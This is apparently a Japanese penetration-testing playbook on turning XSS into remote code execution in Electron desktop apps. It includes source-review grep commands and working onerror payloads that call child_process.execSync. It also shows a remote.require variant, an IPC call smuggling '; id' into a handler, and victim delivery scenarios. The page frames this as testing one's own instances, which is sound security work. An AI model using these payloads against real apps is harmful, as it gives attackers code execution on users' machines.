# Electron アプリ XSS → RCE エスカレーション

> 原理 → `../../06_Concepts/Electron_Security.md`

---

## 着火条件

以下の**3条件がすべて揃った**ときに試す：

1. **Electron デスクトップアプリ**（.exe / .dmg / AppImage 等）を対象にしている
2. **ユーザー制御データが HTML として挿入される sink が存在する**（`.html()` / `innerHTML` / `dangerouslySetInnerHTML`）
3. **`nodeIntegration: true` かつ `contextIsolation: false`** が設定されている

条件 3 が揃っていない場合は XSS 止まり（RCE には至らない）。

---

## 環境前提

- **実行環境**: テスター端末（ソース解析）+ 自分が所有するアプリインスタンス（PoC 検証）
- **必要なツール**: `grep` / `ripgrep`（ソースコード解析用。ペネトレ用 Linux ディストリ標準搭載）
- **前提**: アプリのソースコードまたはビルド済みバイナリが入手できること
  - バイナリのみの場合: `asar` コマンドで `app.asar` を展開すれば TypeScript/JS ソースを取得できる。`@electron/asar`（現在の正式パッケージ名）と旧 `asar` パッケージでコマンドが異なる点に注意:
    - 旧パッケージ: `npx asar extract app.asar out/`
    - `@electron/asar`: `npx @electron/asar extract app.asar out/`（Node.js がなく単発実行する場合）
    - 共通: `asar` が PATH にあれば `asar extract app.asar out/` で動く
- **オフライン代替**: ソースが GitHub 公開リポジトリにある場合は `gh api` または `curl` で生ファイルを取得できる

---

## 観点・着眼点

**先に確認すること**

| 確認項目 | コマンド | 出たら次のアクション |
|---------|---------|----------------|
| `nodeIntegration` の値 | `grep -r "nodeIntegration" src/` | `true` → RCE 到達可能性あり。`false` → 「刺さらなかったとき」の別経路へ |
| `sandbox` の値 | `grep -r "sandbox" src/` | `sandbox: true` が **`nodeIntegration: true` と同時に設定されていると nodeIntegration が無視される**。両方を確認する |
| `contextIsolation` の値 | `grep -r "contextIsolation" src/` | `false` → RCE 到達可能性あり。`true` → 直接 `require()` は不可・preload + contextBridge の expose 内容を確認（下記）|
| `preload` スクリプトの有無 | `grep -r "preload" src/` | あれば `contextBridge.exposeInMainWorld(...)` の内容を確認 — `exec` / `spawn` が expose されていれば `contextIsolation: true` でも RCE |
| `nodeIntegrationInSubFrames` / `nodeIntegrationInWorker` | `grep -r "nodeIntegrationIn" src/` | `true` → サブフレーム / Worker でも Node.js 使える経路 |
| `enableRemoteModule`（Electron < 14）| `grep -r "enableRemoteModule" src/` | `true` → レンダラーから `remote.require()` 経由で Node.js API を呼べる（Electron 14 で削除済み）|
| innerHTML 系 sink の存在 | `grep -r "\.html(" src/` や `grep -r "innerHTML" src/` | ヒットしたらデータフローを追う |
| カスタムプロトコル `app://` 等 | `grep -r "protocol.register" src/` | カスタムプロトコルから XSS や SOP 迂回の起点になる可能性（下記）|

**攻撃者の思考トレース**：
Electron は Chromium + Node.js の複合環境。`nodeIntegration: true` のとき、Electron がレンダラープロセスのグローバルスコープに `require` を注入する。
つまり、XSS でスクリプトを実行できれば `require('child_process')` を呼べる = OS コマンド実行に到達する。
jQuery `.html()` は `innerHTML` と同義であり、サーバー返却値をそのまま渡すとユーザーが制御できる HTML が DOM に挿入される。

**ユーザー制御データの経路を追う**

```
ユーザー入力（テキストフィールド・名前・コメント等）
  → サーバー保存（API 経由）
  → サーバー返却（GET /api/[リソース] → JSON）
  → クライアント描画（対象コンポーネント）
  → sink: $element.html(apiResponse.field)  ← ここが爆発点
```

---

## 手順

**事前準備（必須）：対象は自分が所有・管理するインスタンスのみ。第三者環境には一切ペイロードを送らない。**

## Step 1 — webPreferences を確認する

```bash
# [Attacker] ソースからウィンドウ生成コードを探す
grep -rn "webPreferences" src/ --include="*.ts" --include="*.js"
```

`nodeIntegration: true` かつ `contextIsolation: false` が存在する → 次のステップへ

## Step 2 — XSS sink を探す

```bash
# [Attacker] jQuery .html() sink（innerHTML と同義）
grep -rn "\.html(" src/client/ --include="*.ts" --include="*.js"

# [Attacker] 生の innerHTML
grep -rn "innerHTML" src/client/ --include="*.ts" --include="*.js"

# [Attacker] React の dangerouslySetInnerHTML（要確認）
grep -rn "dangerouslySetInnerHTML" src/ --include="*.tsx" --include="*.jsx"
```

## Step 3 — データフローを確認する

sink にヒットしたファイルを読み、その引数がどこから来るかを追う。

- ユーザー制御可能なフィールド（`apiResponse.[USER_FIELD]`：タイトル / 名前 / 表示名 / コメント本文 / 説明文 等）が sink にそのまま渡されている → サニタイズなし確定
- クライアント側に `DOMPurify.sanitize()` などの呼び出しがなければ脆弱
- 中間に変換（`decodeURIComponent` / `atob` / `JSON.parse` 等）が挟まる場合は、その変換がエンコーダの脅威モデル外ならエンコーダ／デコーダ非対称性（CWE-116）が成立する可能性あり

## Step 4 — PoC レベル 2（ブラウザで原理確認）

```html
<!-- poc_xss_sim.html として保存してブラウザで開く -->
<!DOCTYPE html>
<html>
<body>
  <div id="title"></div>
  <script>
    const payload = '<img src=x onerror="document.getElementById(\'title\').textContent=\'XSS fired\'">';
    document.getElementById('title').innerHTML = payload;
  </script>
</body>
</html>
```

ブラウザで「XSS fired」と表示される → `.html()` / `innerHTML` が任意スクリプトを実行できることを証明。

## Step 5 — PoC レベル 3（アプリ上での実機確認）

自分が所有・管理するアプリインスタンスで実施：

```
1. アプリを起動する
2. XSS ペイロードをデータとして入力・保存する:
   <img src=x onerror="alert('XSS')">
   （入力できる箇所: テキストフィールド・名前欄・説明欄等）
3. そのデータが描画されるビュー／ダイアログを開く
4. alert ダイアログが出る → XSS 発火確認
```

アプリごとに「どのフィールドに入力するか」「どの画面で描画されるか」は異なる。
データフロー解析（Step 3）で特定した sink がトリガーされる操作を行う。

## Step 6 — RCE ペイロードの原理確認（自分のインスタンスのみ）

nodeIntegration: true 環境では、onerror 内で Node.js の `require` を直接呼び出せる：

```html
<!-- 自分のインスタンスのみで確認すること -->
<!-- Linux / macOS: id の出力を alert で表示 -->
<img src=x onerror="alert(require('child_process').execSync('id').toString())">

<!-- Windows: notepad を起動して RCE 到達を確認（calc より安定）-->
<img src=x onerror="require('child_process').execSync('notepad')">
```

Windows では notepad が起動する = OS コマンド実行確定（= RCE 到達）。

> **Windows 10/11 の `calc.exe` について:** `calc` コマンドは Windows 10/11 では UWP ラッパー（`win32calc.exe` → Windows Store 版）経由になる仕様変更があり、`execSync('calc')` でも一応起動するが見た目・挙動が環境で変わり確認が不安定。**PoC としては `notepad` が古い環境・新しい環境ともに確実。**

> **注意**: onerror 属性を `"` で囲んだ場合、内側の文字列は `'` を使う。`'` で囲んだ場合は `&apos;` でエスケープするか `"` に変更する。クォートのネストを誤るとスクリプトが SyntaxError で止まる。

---

## 攻撃者の実際の利用シナリオ

1. **REST API 経由**: アプリが外部向けの API を持つなら、データ書き込みエンドポイントで悪意あるペイロードを保存する
2. **データの共有・同期機能**: コンテンツ共有機能があれば、攻撃者が用意したデータを被害者に読み込ませる
3. **インポート（.zip / バックアップ等）**: 悪意あるアーカイブやエクスポートデータをインポートさせる
4. **ローカル DB 直接書き換え**: SQLite 等の DB に直接アクセスできる場合

被害者はアプリの「正常な操作」をするだけで RCE が発火する（悪意あるデータが描画されるビューを開くだけでよい）。

---

## 刺さらなかったとき

| 観測される状況 | 推定原因 | 次の手 |
|-------------|---------|-------|
| `nodeIntegration: false` が設定されている | セキュリティ強化（の「つもり」）| XSS は残る場合あり。RCE には至らないが XSS 単体評価 + 下記代替経路を確認 |
| `sandbox: true` が `nodeIntegration: true` と同時に設定されている | sandbox が nodeIntegration を上書き — `nodeIntegration` が無効化される | `sandbox` 明示設定時は nodeIntegration を期待できない。preload + contextBridge 経路へ |
| `contextIsolation: true` | 直接 `require()` は不可 | **preload スクリプトの `contextBridge.exposeInMainWorld(...)` で `exec` / `spawn` / `child_process` 等が expose されていれば XSS から呼べる**。`grep -r "exposeInMainWorld" src/` で expose 内容を全確認 |
| preload が `exec` を expose していても RCE にならない | contextBridge 経由のラッパーに入力サニタイズがある | ラッパー実装を読んでバイパスを探す |
| `nodeIntegrationInSubFrames: false` （既定）/ `nodeIntegrationInWorker: false` | サブフレーム・Worker では Node.js 無効 | `true` に変わっていればサブフレーム内の XSS から RCE 経路あり |
| `enableRemoteModule: true`（Electron < 14 のみ）| レンダラーから `remote.require()` 経由で Node.js API を呼べる | `const { remote } = require('electron'); remote.require('child_process').execSync('id')` |
| カスタムプロトコル（`app://` / `myapp://` 等）が存在 | SOP 迂回 / スクリプト実行起点になりうる | `protocol.registerFileProtocol` / `protocol.registerHttpProtocol` の実装を確認。カスタムプロトコル経由で XSS が起きると `file:` と同等の権限でスクリプト実行される場合あり |
| **IPC 経由 RCE**（メインプロセスで `ipcMain.on` が OS コマンドを受け取る）| `nodeIntegration: false` かつ `contextIsolation: true` でも、メインプロセスのハンドラが引数を無検証でコマンド実行する場合 | `grep -r "ipcMain.on\|ipcMain.handle" src/` でハンドラ一覧 → 引数をサニタイズせず `exec` に渡す実装を探す。XSS から `ipcRenderer.invoke('[HANDLER_NAME]', '; id')` で呼ぶ |
| `DOMPurify.sanitize()` が sink 前に呼ばれている | クライアント側サニタイズあり | 他の sink（`innerHTML` を使っている別コンポーネント）を探す |
| React の JSX `{}` で値が挿入されている | JSX の自動エスケープが有効 | この経路は安全。別 sink を探す |
| アプリが古い Electron（< 5）を使っている | デフォルトが true だった時代のコードが残存 | `nodeIntegration` を明示的に `false` にしているかを確認する |

---

## 注意点・落とし穴

- **`require()` はアプリのコードには書いていない**：`nodeIntegration: true` のとき Electron がレンダラーのグローバルに `require` を inject する。コードを grep しても出てこないが、XSS ペイロード内で使える。
- **onerror 内のクォート問題**：`onerror="require('child_process')..."` のように外側が `"` なら内側は `'` で問題ない。外側が `'` のとき内側に `'` を使うと SyntaxError になる。
- **開発停止・archived リポジトリでも CVE は有効**：脆弱バージョンのユーザーは引き続き存在する。CVE 申請・開示の意義はなくならない。
- **PoC のクォートが壊れていても XSS 自体は発火する**：onerror が実行された証拠は「コンソールに SyntaxError が出た」こと。壊れたアイコン（画像 src のロード失敗）が表示されたら onerror イベントは発火しており、XSS 到達は確認できている。

---

## 関連技術

- 前：Electron アプリの存在を確認（ファイル拡張子 / プロセス名 / パッケージ情報） → `../../01_Reconnaissance/Web_Enumeration.md`
- 前：XSS sink の基本パターン（.html() / innerHTML の危険性）→ `./XSS.md`（コードレビュー観点セクション）
- 後：RCE 到達後の OS コマンド実行 → リバースシェル取得 → `../../06_Concepts/Reverse_Shell.md`
- 関連：Electron の nodeIntegration / contextIsolation の仕組み → `../../06_Concepts/Electron_Security.md`
- 関連：バリアント（同クラスの脆弱性を別プロジェクトで探す手法）→ `../../06_Concepts/Variant_Hunting.md`
